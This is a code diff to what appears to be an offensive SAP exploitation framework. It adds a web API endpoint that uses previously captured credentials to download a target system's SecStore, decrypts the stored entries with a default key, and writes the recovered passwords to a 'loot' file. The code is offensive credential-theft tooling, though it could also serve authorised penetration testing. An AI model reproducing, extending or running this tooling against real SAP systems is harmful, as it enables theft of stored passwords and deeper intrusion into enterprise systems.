@@ -23,6 +23,7 @@ import sapmap_scanner
 import sapmap_rfc
 import sapmap_exploit
 import sapmap_cleanup
+import sapmap_secstore
 import sapmap_state as state_mgr
 
 def _derive_sid(destination_name: str, host: str) -> str:
@@ -1033,6 +1034,32 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 print(f"[+] {len(rows)} rows from {table} saved to {outfile}")
 
         _bg(f"{sid}:download_table", "Download Table", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/download_secstore", method="POST")
+    def node_download_secstore(sid):
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        key_hex = data.get("key_hex", "") or sapmap_secstore.DEFAULT_KEY_HEX
+
+        def _run():
+            creds = node.best_credentials()
+            try:
+                results = sapmap_secstore.download_and_decrypt(node, creds, key_hex)
+                ok  = [r for r in results if not r.get("error") and r.get("password")]
+                err = [r for r in results if r.get("error")]
+                states_dir = os.path.join(os.path.dirname(__file__), "states")
+                outfile = sapmap_secstore.save_loot(node.sid, results, states_dir)
+                print(f"[+] SecStore {sid}: {len(results)} entries, "
+                      f"{len(ok)} decrypted, {len(err)} errors → {outfile}")
+            except Exception as e:
+                print(f"[-] SecStore {sid}: {e}")
+
+        _bg(f"{sid}:download_secstore", "Download SecStore", _run)
         return json.dumps({"status": "started"})
 
     @app.route("/api/node/<sid>/create_tcpip_dest", method="POST")
